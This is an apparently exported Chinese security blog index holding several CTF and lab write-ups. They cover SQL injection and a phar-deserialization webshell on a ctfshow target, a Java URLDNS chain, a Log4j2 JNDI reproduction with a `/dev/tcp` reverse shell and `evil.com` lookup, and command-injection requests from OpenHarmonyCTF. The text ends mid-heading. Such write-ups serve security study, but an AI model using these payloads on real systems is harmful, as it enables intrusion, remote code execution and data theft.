mysqli($dbhost,$dbuser,$dbpwd,$dbname);\n\t\tif(mysqli_connect_errno()){\n\t\t\tdie(json_encode(array(mysqli_connect_error())));\n\t\t}\n\t\t$conn->query(\"set name $charName\");\n\t\t\n\t\t$sql = \"select password from user where username = '$username' and password = '$password' limit 0,1;\";\n\n\t\t$result = $conn->query($sql);\n\t\t$row = $result->fetch_array(MYSQLI_ASSOC);\n\n\t\tif($row['password']===$password){\n\t\t\t$_SESSION['LOGIN']=true;\n\n\t\t}else{\n\t\t\t$_SESSION['LOGIN']=false;\n\t\t\t$_SESSION['msg']='登陆失败';\n\n\t\t}\n\t\t$conn->close();\n\t\t$_SESSION['LOGIN']?$this->dispatcher(\"../ckfinder/ckfinder.html\"):$this->dispatcher(\"../index.php\");\n\t}\n\n\n\tfunction doReset(){\n\t\tinclude 'config.php';\n\t\t$email = filter_input(INPUT_POST, 'email',FILTER_VALIDATE_EMAIL);\n\t\t$username = $this->doFilter($_POST['username']);\n\t\t$conn = new mysqli($dbhost,$dbuser,$dbpwd,$dbname);\n\t\tif(mysqli_connect_errno()){\n\t\t\tdie(json_encode(array(mysqli_connect_error())));\n\t\t}\n\t\t$conn->query(\"set name $charName\");\n\t\t\n\t\t$sql = \"select email from user where email = '$email' and username = '$username'\";\n\n\t\t$result = $conn->query($sql);\n\t\t$row = $result->fetch_array(MYSQLI_ASSOC);\n\t\tif($row['email']){\n\t\t\t\t$_SESSION['RESET']=true;\n\t\t\t\t$this->email = $row['email'];\n\t\t\t\t$_SESSION['msg']=\"你好！ 已经将重置密码链接发送至邮箱\".$this->email;\n\t\t}else{\n\t\t\t$_SESSION['RESET']=false;\n\t\t\t$_SESSION['msg']=\"邮箱不存在\";\n\t\t}\n\t\t$conn->close();\n\t\t$this->dispatcher(\"../index.php\");\n\t}\n\n\tfunction doDefault(){\n\t\theader(\"location: ../index.php\");\n\t}\n\n\tfunction doFilter($str){\n\t\t$str = str_replace(\"'\", \"%27\", $str);\n\t\t$str = str_replace(\"\\\"\", \"%22\", $str);\n\t\t$str = str_replace(\"\\\\\", \"%5c\", $str);\n\n\t\treturn $str;\n\t}\n\n\n\tfunction dispatcher($url){\n\t\theader(\"location:$url\");\n\n\t}\n\n\t\n\n\tpublic function __wakeup(){\n\t\t$this->clear();\n\t}\n\n\tfunction sendResetMail($mail){\n\t\t$content = \"你好，下面是你的重置密码链接，请复制到浏览器地址栏打开.\";\n\t\t$content.= \"http://xxx.com/?token=xxxx&email=$mail\";\n\n\t\t//功能暂未实现，先保留邮件，以后发送\n\t\tfile_put_contents(\"../mail_cache/cache.php\",\"<?php exit('$content');?>\");\n\t\t\n\t}\n\n\tfunction checkSession(){\n\t\tif($_SESSION['LOGIN']!==true){\n\t\t\tdie(\"请先登陆\");\n\t\t\treturn false;\n\t\t}else{\n\t\t\treturn true;\n\t\t}\n\t\t\n\t}\n\tfunction doView(){\n\n\t\t$this->checkSession();\n\t\t$file=str_replace(\"..\",\"\",$_POST['file']);\n\n\t\tif(file_exists($file)){\n\t\t\t\n\t\t\theader(\"Content-type: image/jpeg\");\n\t\t\techo file_get_contents(\"../ckfinder/userfiles/\".$file);\n\t\t}\n\t}\n\n\tfunction clear(){\n\t\tif($_SESSION['LOGIN'] && isset($this->email)){\n\t\t\t$this->sendResetMail($this->email);\n\t\t}\n\t}\n\n\t\n\n}\n\n//hack here;\n$action = new action();\n$action->doAction();\n```\n\n在登录界面发现账号密码都存在一个filter过滤，但是我们关注到重置页面\n\n```php\n\tfunction doReset(){\n\t\tinclude 'config.php';\n\t\t$email = filter_input(INPUT_POST, 'email',FILTER_VALIDATE_EMAIL);\n\t\t$username = $this->doFilter($_POST['username']);\n\t\t$conn = new mysqli($dbhost,$dbuser,$dbpwd,$dbname);\n\t\tif(mysqli_connect_errno()){\n\t\t\tdie(json_encode(array(mysqli_connect_error())));\n\t\t}\n\t\t$conn->query(\"set name $charName\");\n\t\t\n\t\t$sql = \"select email from user where email = '$email' and username = '$username'\";\n\n\t\t$result = $conn->query($sql);\n\t\t$row = $result->fetch_array(MYSQLI_ASSOC);\n\t\tif($row['email']){\n\t\t\t\t$_SESSION['RESET']=true;\n\t\t\t\t$this->email = $row['email'];\n\t\t\t\t$_SESSION['msg']=\"你好！ 已经将重置密码链接发送至邮箱\".$this->email;\n\t\t}else{\n\t\t\t$_SESSION['RESET']=false;\n\t\t\t$_SESSION['msg']=\"邮箱不存在\";\n\t\t}\n\t\t$conn->close();\n\t\t$this->dispatcher(\"../index.php\");\n\t}\n```\n\n这里的话对email并没有过滤，尝试sql注入fuzz一下\n\n![image-20250615213106421](../image/achieve/202411/内网渗透/image-20250615213106421.png)\n\n过滤空格了，绕过一下，可以用`/**/`去绕过\n\n过滤了括号，双引号，然后我们注入一下\n\n```\nemail='union/**/select/**/username/**/from/**/user#@qq.com&username=123\nemail='union/**/select/**/password/**/from/**/user#@qq.com&username=123\n```\n\n拿到账号密码\n\n```\nctfshow/ctfshase????\n```\n\n登录进去是一个文件上传的口子，不过这个这个框架应该是没啥问题的，返回去看看源码吧\n\n在api/index.php中存在一个写文件的功能，假如可以控制`$mail`的值，就可以写入一个木马进去。\n\n![image-20250615214146718](../image/achieve/202411/内网渗透/image-20250615214146718.png)\n\n先看看在哪调用了这个方法\n\n![image-20250615214246659](../image/achieve/202411/内网渗透/image-20250615214246659.png)\n\n然后再看哪里调用了clear\n\n![image-20250615214345087](../image/achieve/202411/内网渗透/image-20250615214345087.png)\n\n起始调用点是`__wakeup`，结合文件上传的口子，那我们可以打phar反序列化，在doView函数中\n\n```php\n\tfunction doView(){\n\n\t\t$this->checkSession();\n\t\t$file=str_replace(\"..\",\"\",$_POST['file']);\n\n\t\tif(file_exists($file)){\n\t\t\t\n\t\t\theader(\"Content-type: image/jpeg\");\n\t\t\techo file_get_contents(\"../ckfinder/userfiles/\".$file);\n\t\t}\n\t}\n```\n\n这里file参数的可控的，那我们就可以传文件打phar反序列化了\n\n```php\n<?php\n\nclass action{\n    private $email=\"'.eval(\\$_POST[1]));//\";\n}\n$obj = new action();\n\n$phar = new phar('test.phar');//后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(file_get_contents('1.png').\"<?php __HALT_COMPILER(); ?>\");\n$phar->setMetadata($obj);//自定义的meta-data存入manifest\n$phar->addFromString(\"flag.txt\",\"flag\");//添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n\n```\n\n这里的话有一个检测，需要绕过一下，随便找一个小点的图片，将生成的phar文件后缀名换成png然后上传\n\n![image-20250615221207242](../image/achieve/202411/内网渗透/image-20250615221207242.png)\n\n上传成功之后我们触发doView方法并触发反序列化\n\n![image-20250615221338406](../image/achieve/202411/内网渗透/image-20250615221338406.png)\n\n触发后访问/mail_cache/cache.php\n\n![image-20250615221510399](../image/achieve/202411/内网渗透/image-20250615221510399.png)\n\n试着RCE试一下\n\n```php\n1=phpinfo();\n```\n\n![image-20250615221535580](../image/achieve/202411/内网渗透/image-20250615221535580.png)\n\n成了，那我们用蚁剑连接，但是其实这个靶机里没有flag，最戏剧的一集了哈哈哈哈哈\n\n","tags":["内网渗透"],"categories":["ctfshow"]},{"title":"Java反序列化URLDNS利用链","url":"/2025/06/15/Java反序列化URLDNS利用链/","content":"\n其实这条链子是很简单的，可能压根不需要额外写文章，但因为自己最近相对沉迷于审链子审代码，所以还是决定写一篇文章去看看\n\n## 0x01URLDNS利用链简介\n\nURLDNS是比较简单的一个链，比较适用于漏洞验证， 且并不依赖于第三方的类，而是JDK中的内置的类和方法，所以不受jdk版本的限制。适用于目标没有回显的情况。\n\n## 0x02源码分析\n\njdk版本：8u56\n\n还是和之前一样，先从出口进行寻找\n\n我们知道readObject是java反序列化的关键函数，URLDNS链的触发方式就是使用readObject函数，所以使用搜索readObject找到了HashMap。\n\n![image-20250615153913601](../image/achieve/202411/java学习/image-20250615153913601.png)\n\n可以看到这里用到了一个hash函数，key就是参数，我们跟进一下这个方法\n\n![image-20250615153951229](../image/achieve/202411/java学习/image-20250615153951229.png)\n\n这里会调用一个hashCode方法，并且是key属性的hashCode方法，那我们如果key是一个对象的话，就可以利用到对象的hashCode方法，但是这个key是否可控呢？\n\n返回到前面的readObject方法可以看到是在putVal函数中进行hash的调用，并且这个函数是在put方法中进行调用的\n\n![image-20250615154254740](../image/achieve/202411/java学习/image-20250615154254740.png)\n\n然后我们看一下关于hashCode的用法\n\n看到URL类中有hashCode方法，并且方法中调用了hashCode方法\n\n![image-20250615153013048](../image/achieve/202411/java学习/image-20250615153013048.png)\n\n接入了序列化接口，URL类可以被序列化操作\n\n![image-20250615153159235](../image/achieve/202411/java学习/image-20250615153159235.png)\n\n在307行可以看到此时URL的hashCode默认为-1，然后我们看看hashCode方法\n\n```java\npublic synchronized int hashCode() {\n    if (hashCode != -1)\n        return hashCode;\n\n    hashCode = handler.hashCode(this);\n    return hashCode;\n}\n```\n\n这里的话会对hashCOde的值进行一个检查，如果值为-1则会调用handler的hashCode方法，所以只要不更改hashCode的值就会调用该方法进行赋值操作，我们跟进一下handler\n\n![image-20250615154801614](../image/achieve/202411/java学习/image-20250615154801614.png)\n\n有一个抽象类URLStreamHandler，继续跟进找到里面的hashCode方法\n\n```java\n    protected int hashCode(URL u) {\n        int h = 0;\n\n        // Generate the protocol part.\n        String protocol = u.getProtocol();\n        if (protocol != null)\n            h += protocol.hashCode();\n\n        // Generate the host part.\n        InetAddress addr = getHostAddress(u);\n        if (addr != null) {\n            h += addr.hashCode();\n        } else {\n            String host = u.getHost();\n            if (host != null)\n                h += host.toLowerCase().hashCode();\n        }\n\n        // Generate the file part.\n        String file = u.getFile();\n        if (file != null)\n            h += file.hashCode();\n\n        // Generate the port part.\n        if (u.getPort() == -1)\n            h += getDefaultPort();\n        else\n            h += u.getPort();\n\n        // Generate the ref part.\n        String ref = u.getRef();\n        if (ref != null)\n            h += ref.hashCode();\n\n        return h;\n    }\n```\n\n这里出现了很多的方法，我们挨个分析一下\n\n- getProtocol()方法\n\n![image-20250615155239819](../image/achieve/202411/java学习/image-20250615155239819.png)\n\n是用来从url中获取协议的方法\n\n- getHostAddress()方法\n\n![image-20250615155352960](../image/achieve/202411/java学习/image-20250615155352960.png)\n\n这里的话就是根据主机名获取其ip地址，其实就是一次DNS查询\n\n然后我们看看URL的构造函数\n\n![image-20250615161458176](../image/achieve/202411/java学习/image-20250615161458176.png)\n\n是公共属性的，并且我们可以传入一个主机名或ip地址\n\n## 0x03EXP编写\n\n经过上面的分析，我们基本上可以知道链子的结构了，就是通过调用URL的hashCode方法，进而调用URLStreamHandler的hashCode方法，从而实现DNS查询，所以只需要我们令hashCOde的值为-1就可以让后半段链子实现，然后我们来看前半段\n\n为了调用到URL中的hashCode方法，我们需要借助到hashMap类的readObject方法，因为在这个方法里面对key的hashCode进行了计算，如果key重写了hashCode方法，那么计算逻辑就是使用key的hashCode()方法，所以我们可以将URL对象作为key传入hashMap中，但是要想最终调用hashCode()方法，就必须让URL的hashCode的值为-1，因此我们可以利用反射在运行状态中操作URL的hashCode，从而实现DNS查询的目的。\n\n```java\nHashMap.readObject()\n \tHashMap.putVal()\n  \t\tHashMap.hash()\n   \t\t\tURL.hashCode()\n```\n\n然后我们写个exp测试一下\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.net.URL;\n\npublic class URLDNS {\n    public static void main(String[] args) throws Exception{\n        //构造函数中可以传入一个ip地址\n        URL url = new URL(\"viyjtklaju.zaza.eu.org\");\n        Class c = url.getClass();\n        Field hashCode = c.getDeclaredField(\"hashCode\");\n        //受保护类型，需要设置权限\n        hashCode.setAccessible(true);\n        //将URL的hashCode设置为不是-1，就不会在put的时候调用hashCode访问dns了\n        hashCode.set(url,1);\n        HashMap<URL, Integer> map = new HashMap<>();\n        map.put(url, 1);\n        //将URL的hashCode设置为-1，是为了在反序列化的时候调用URL的hashCode访问dns\n        hashCode.set(url,-1);\n        serialize(map);\n        unserialize(\"URLDNSpoc.txt\");\n    }\n\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"URLDNSpoc.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois  = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n        ois.close();\n    }\n}\n```\n\n![image-20250615164256900](../image/achieve/202411/java学习/image-20250615164256900.png)\n\n## 0x04总结\n\n这个链子其实并不能带来实质性的攻击，但是可以在一些没有回显的漏洞的时候利用该链去证明漏洞是否存在，或者是否出网\n\n\n\n\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"Log4j2的JNDI注入漏洞复现","url":"/2025/06/09/Log4j2的JNDI注入漏洞复现/","content":"\n参考文章：\n\nhttps://www.freebuf.com/vuls/316143.html\n\nhttps://www.cnblogs.com/0dot7/p/17259327.html\n\n## 0x01漏洞描述\n\n### 关于Log4j2\n\nLog4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似\n\n### Log4j2 Lookup\n\nLog4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。\n\n格式类似\"${type:var}\"，即可以实现对变量var的引用。type可以是如下值：\n\n1. ctx：允许程序将数据存储在 Log4j `ThreadContext`Map 中，然后在日志输出过程中，查找其中的值。\n2. env：允许系统在全局文件（如 /etc/profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：`${env:USER}`。\n3. java：允许查找Java环境配置信息。例如：`${java:version}`。\n4. jndi：允许通过 JNDI 检索变量。\n5. ...\n\n这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因\n\n### 漏洞成因\n\nJNDI（Java Naming and Directory Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。\n\nJNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源\n\n由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于`${jndi:ldap://evil.com/example}`的lookup用于进行JNDI注入，执行任意代码。\n\n**`rmi:` 协议**\n\n- **RMI（Remote Method Invocation）** 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。\n- 在 Log4j2 漏洞中，攻击者可以通过 `rmi:` 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。\n\n**`ldap:` 协议**\n\n- **LDAP（Lightweight Directory Access Protocol）** 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。\n- 在 Log4j2 漏洞中，攻击者可以通过 `ldap:` 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。\n\n我们举个例子\n\n```\n${jndi:ldap://127.0.0.1/shell}\n```\n\n当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap://127.0.0.1/shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入\n\n## 0x02环境搭建&漏洞复现\n\nvulhub靶场有现成的环境\n\n```\ncd vulhub/log4j/CVE-2021-44228/\ndocker-compose up -d\n```\n\n使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1\n\n起环境后访问8983端口\n\n![image-20250609200609371](../image/achieve/202411/CVE复现/image-20250609200609371.png)\n\n然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器\n\n![image-20250609201014360](../image/achieve/202411/CVE复现/image-20250609201014360.png)\n\n\n\n```\n${jndi:ldap://wsythhvyqt.dgrh3.cn}\n```\n\n利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显\n\n然后就是漏洞利用了\n\n使用JNDI注入工具\n\n```\n工具地址：https://github.com/welk1n/JNDI-Injection-Exploit\n```\n\n然后我们构造反弹shell\n\n```\nbash -i >& /dev/tcp/vps.ip/port 0>&1\n```\n\n然后用工具进行注入\n\n![image-20250609201723324](../image/achieve/202411/CVE复现/image-20250609201723324.png)\n\n我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了\n\n![image-20250609201756653](../image/achieve/202411/CVE复现/image-20250609201756653.png)\n\n到此靶场的复现就完成了\n\n## 0x03影响版本\n\nApache Log4j2 2.0.0 - 2.15.0-rc1版本\n","tags":["JNDI注入"],"categories":["JNDI注入"]},{"title":"OpenHarmonyCTF2025","url":"/2025/06/09/OpenHarmonyCTF2025/","content":"\n忘记报名了，赛后复现emmm\n\n## Layers of Compromise\n\n打开题目是一个登录界面，扫目录拿到一个配置文件\n\n![417e26424798388df3f440b2aae96930](../image/achieve/202411/鸿蒙CTF/417e26424798388df3f440b2aae96930.png)\n\n```htaccess\n# .htaccess\nOptions -Indexes\nphp_flag display_errors off\n\n<Files \"config.php\">\n    Order Allow,Deny\n    Deny from all\n</Files>\n\n# 限制访问API目录\n<FilesMatch \"^debug\\.php$\">\n    Order Deny,Allow\n    Deny from all\n</FilesMatch>\n```\n\n还有一个debug.php但是感觉没啥用\n\n首先弱密码登录后台`user\\password123`后发现文档中有两个管理员文档\n\n在cookie中伪造admin就可以访问了\n\n![image-20250609114751826](../image/achieve/202411/鸿蒙CTF/image-20250609114751826.png)\n\n访问日志就会自动跳到登录界面，在第二个文档中看到有一个开发令牌在/data/app/www/secrettttts/目录下，扫目录拿到一个token.txt\n\n```php\n7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n\n--auth.php\nif (isset($_COOKIE['auth_token'])) {\n    $auth_data = unserialize(base64_decode($_COOKIE['auth_token']));\n    if ($auth_data['username'] === 'dev' && \n        $auth_data['hash'] === md5('dev' . $CONFIG['auth_key'])) {\n        return true;\n    }\n}\n--\n'username'=>'dev' 'auth_key' => 'S3cr3tK3y!2023'\n```\n\n写个代码\n\n```php\n<?php\n// 认证信息\n$username = 'dev';\n$auth_key = 'S3cr3tK3y!2023';\n\n// 计算hash值\n$hash = md5($username . $auth_key);\n\n// 构造认证数据数组\n$auth_data = array(\n    'username' => $username,\n    'hash' => $hash\n);\n\n// 序列化并base64编码\n$serialized = serialize($auth_data);\n$auth_token = base64_encode($serialized);\n//YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==\n```\n\n然后我们伪造auth_token后就出现日志文件了\n\n![image-20250609122643839](../image/achieve/202411/鸿蒙CTF/image-20250609122643839.png)\n\n看了半天没看出来什么，猜测这个传入的是系统命令进行拼接，抓包处理吧\n\n```\nPOST /logs.php HTTP/1.1\nHost: web-4cc94827f7.challenge.xctf.org.cn\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nOrigin: http://web-4cc94827f7.challenge.xctf.org.cn\nCookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==\nUpgrade-Insecure-Requests: 1\nReferer: http://web-4cc94827f7.challenge.xctf.org.cn/logs.php\nContent-Length: 27\n\naction=filter_logs&filter=1\n```\n\n![image-20250609124216533](../image/achieve/202411/鸿蒙CTF/image-20250609124216533.png)\n\n![image-20250609124244099](../image/achieve/202411/鸿蒙CTF/image-20250609124244099.png)\n\n发现这里需要双引号包裹并且过滤了空格，尝试前后闭合\n\n![image-20250609124405087](../image/achieve/202411/鸿蒙CTF/image-20250609124405087.png)\n\n尝试命令执行\n\n```\nPOST /logs.php HTTP/1.1\nHost: web-4cc94827f7.challenge.xctf.org.cn\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nOrigin: http://web-4cc94827f7.challenge.xctf.org.cn\nCookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==\nUpgrade-Insecure-Requests: 1\nReferer: http://web-4cc94827f7.challenge.xctf.org.cn/logs.php\nContent-Length: 27\n\naction=filter_logs&filter=\"${IFS}/etc/passwd;whoami\"\n```\n\n有回显，可以rce，那直接打\n\n```\nPOST /logs.php HTTP/1.1\nHost: web-4cc94827f7.challenge.xctf.org.cn\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nOrigin: http://web-4cc94827f7.challenge.xctf.org.cn\nCookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==\nUpgrade-Insecure-Requests: 1\nReferer: http://web-4cc94827f7.challenge.xctf.org.cn/logs.php\nContent-Length: 27\n\naction=filter_logs&filter=\"${IFS}/etc/passwd;ls${IFS}/data\"\n```\n\n```\nPOST /logs.php HTTP/1.1\nHost: web-4cc94827f7.challenge.xctf.org.cn\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nOrigin: http://web-4cc94827f7.challenge.xctf.org.cn\nCookie: role=admin; username=admin; auth_token=YToyOntzOjg6InVzZXJuYW1lIjtzOjM6ImRldiI7czo0OiJoYXNoIjtzOjMyOiI1ZGEwYjcxNTZkZDk1ZGQ3ZjdlYmNlNjA4YTBhNDY2YiI7fQ==\nUpgrade-Insecure-Requests: 1\nReferer: http://web-4cc94827f7.challenge.xctf.org.cn/logs.php\nContent-Length: 27\n\naction=filter_logs&filter=\"${IFS}/etc/passwd;head${IFS}/data/fl\"\"ag/f*\"\n```\n\n发现还过滤了flag，也是可以绕过的\n\n## Filesystem\n\n有个控制器文件，挨个分析一下\n\n```ts\n// admin.controller.ts\nimport {\n    Controller,\n    Post,\n    Body,\n    HttpException,\n    HttpStatus,\n    Response, Get, Query, Request, Render, Optional, BadRequestException,\n} from '@nestjs/common';\nimport { JwtService } from '@nestjs/jwt';\nimport * as fs from 'fs';\nimport {IsInt, IsOptional, IsString, Length, validate} from \"class-validator\";\nimport * as gray from \"gray-matter\"\n\nconst configFile = \"/opt/filesystem/adminconfig.lock\"\n\nclass AdminLoginDto {\n    @IsOptional()\n    @IsString({ message: 'Name must be a string' })\n    @Length(0, 15, { message: 'length < 15' })\n    username: string;\n\n\n    @Length(0, 15, { message: 'length < 15' })\n    password: number;\n\n    @IsOptional()\n    @Length(0, 15, { message: 'length < 15' })\n    slogon: string\n}\n@Controller('/admin')\nexport class AdminController {\n    private readonly username = 'admin';\n\n\n    constructor(private readonly jwtService: JwtService) {}\n\n    private getAdminConfig() {\n        try {\n            const data = fs.readFileSync(configFile, 'utf8');\n            return JSON.parse(data);\n        } catch (error) {\n            throw new HttpException('Failed to read config file', HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n    }\n\n    @Post('login')\n    async login(@Body() body: any, @Response() res) {\n        const loginUser = Object.assign(new AdminLoginDto(), body)\n        const { password: correctPassword, slogon } = this.getAdminConfig();\n        const errors = await validate(loginUser, {forbidUnknownValues: false});\n        if (errors.length > 0) {\n            throw new BadRequestException(errors);\n        }\n        if (loginUser.username !== this.username || loginUser.password !== correctPassword) {\n            throw new HttpException('Invalid credentials', HttpStatus.UNAUTHORIZED);\n        }\n\n        const payload = { username: this.username, slogon };\n        const token = this.jwtService.sign(payload);\n\n\n        res.cookie('token', token, { httpOnly: true });\n        return res.status(200).json({ message: '登录成功' });\n    }\n\n    @Get('login')\n    @Render('login')\n    renderLogin() {\n\n    }\n\n    @Get('index')\n    // @Render(\"admin\")\n    renderAdmin(@Request() req, @Response() res) {\n        console.log(req.cookies)\n        const token = req.cookies.token;\n\n        if (!token) {\n            return res.status(401).json({ message: '未授权' });\n        }\n\n        try {\n            const decoded = this.jwtService.verify(token);\n            const profile = gray.stringify(gray(decoded.slogon).content, {username: decoded.username})\n            console.log(profile)\n            res.render('admin', {\"info\": profile});\n        } catch (error) {\n            return res.status(401).json({ message: '无效的令牌' });\n        }\n    }\n\n\n    @Get('changePassword')\n    // @Render(\"admin\")\n    change(@Request() req, @Response() res) {\n        console.log(req.cookies)\n        const token = req.cookies.token;\n\n        if (!token) {\n            return res.status(401).json({ message: '未授权' });\n        }\n\n        try {\n            const decoded = this.jwtService.verify(token);\n            res.render('change');\n        } catch (error) {\n            return res.status(401).json({ message: '无效的令牌' });\n        }\n    }\n\n\n    @Post('changePassword')\n    async changePassword(@Request() req, @Body() body: any, @Response() res) {\n        const token = req.cookies.token;\n        const { password, slogon } = this.getAdminConfig();\n        const newUser = Object.assign(new AdminLoginDto(), body)\n        const errors = await validate(newUser, {forbidUnknownValues: false});\n        if (errors.length > 0) {\n            throw new BadRequestException(errors);\n        }\n\n        if (!token) {\n            return res.status(401).json({ message: '未授权' });\n        }\n\n        try {\n            const decoded = this.jwtService.verify(token);\n\n\n            if (newUser.slogon == null) newUser.slogon = slogon\n            const newInfo = JSON.stringify(newUser)\n            fs.writeFileSync(configFile, JSON.stringify(newUser, null, 2));\n            return res.status(200).json({message: '修改成功'})\n        } catch (error) {\n            return res.status(401).json({ message: '发生错误' });\n        }\n\n\n\n    }\n\n\n\n\n}\n\n```\n\n一个admin控制器，可以生成jwt并验证，并且这里jwt的可控的\n\n```ts\nimport {\n  Controller,\n  Post,\n  Body,\n  HttpException,\n  HttpStatus,\n  Response,\n  Get,\n  Query,\n  Request,\n  Render,\n  Optional,\n  BadRequestException,\n  Param,\n  NotFoundException,\n  UploadedFile,\n  UseInterceptors,\n} from '@nestjs/common';\nimport {IsString, IsInt, validate, ValidateIf, Length} from 'class-validator';\n// import { plainToClass } from 'class-transformer';\nimport {validateOrReject, Contains, IsEmail, IsFQDN, IsDate, Min, Max} from \"class-validator\";\nimport * as filehelper from \"./functions\"\nimport * as path from \"path\";\nimport {FileInterceptor} from \"@nestjs/platform-express\";\nimport * as fs from \"fs\";\n\nconst uploadPath = \"/opt/uploads\"\n\n\n@Controller()\nexport class AppController {\n  @Get('')\n  @Render('index')\n  index(){\n  }\n  @Post('upload')\n  @UseInterceptors(FileInterceptor('file'))\n  async doUpload(@UploadedFile() file: Express.Multer.File) {\n    const targetPath = path.join(uploadPath, file.originalname);\n    console.log(targetPath)\n    if(file.originalname.endsWith(\".zip\") || file.originalname.endsWith(\".tar\")){\n      fs.renameSync(file.path, targetPath);\n      var result :string\n      result = await  filehelper.extractArc(targetPath)\n\n      return { message: '文件上传解压成功成功！文件夹为：', path: path.basename(result) }\n    }else{\n      fs.renameSync(file.path, targetPath);\n      return { message: '文件上传成功！', path: file.originalname };\n    }\n  }\n\n\n  @Get('download')\n  async downloadFile(@Query('filename') filename: string, @Response() res) {\n    if(filename.includes(\"./\")) throw new NotFoundException('路径不合法');\n    const filePath = path.join('/opt/uploads', filename);\n\n    if (!fs.existsSync(filePath)) {\n      throw new NotFoundException('文件未找到');\n    }\n\n    res.download(filePath, (err) => {\n      if (err) {\n        res.status(500).send('下载失败');\n      }\n    });\n  }\n}\n\n\n```\n\n让我缓一下，感觉不太会。。。\n\n\n\n","tags":["OpenHarmonyCTF2025"],"categories":["赛题wp"]},{"title":"一些python内存马的学习","url":"/2025/06/09/一些python内存马的学习/","content":"\n## 0x01前置知识\n\n### 